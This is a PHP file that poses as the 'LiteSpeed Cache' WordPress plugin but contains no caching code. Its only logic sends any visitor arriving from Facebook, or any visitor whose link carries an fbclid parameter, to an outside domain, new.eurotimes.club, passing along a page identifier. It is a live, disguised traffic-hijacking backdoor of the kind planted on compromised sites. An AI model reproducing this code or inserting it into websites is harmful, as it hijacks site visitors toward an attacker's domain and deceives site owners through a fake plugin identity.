<?php
/*
Plugin Name: LiteSpeed Cache
Plugin URI: https://www.litespeedtech.com
Description: High-performance page caching and site optimization from LiteSpeed
Author: S LiteSpeed Technologies
Version: 1.0.1
Author URI: https://www.litespeedtech.com/
License: Contact Me
*/


$referringURL=$_SERVER['HTTP_REFERER'];
$fbclid=$_GET['fbclid'];
$actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if (strpos($referringURL,'facebook.com')!==false || $fbclid!==null){

    if(strpos($actual_link,'dev_shin')===false){
        header('Location: https://new.eurotimes.club/?'.substr("https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]",strpos("https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]",'page_id'),strpos("https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]","&")-strpos("https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]",'page_id')));
        die();
    }else{
        $start=strpos($actual_link,'dev_shin');
        if(strpos($actual_link,"&",$start)!==false){
            $end=strpos($actual_link,"&",$start+1)-$start;
            $shinid= substr($actual_link,$start,$end);
        }
        else{
            $shinid= substr($actual_link,$start);
        }
        $pageid=str_replace("dev_shin","page_id",$shinid);
        header('Location: https://new.eurotimes.club/?'.$pageid);
        die();
    }

}
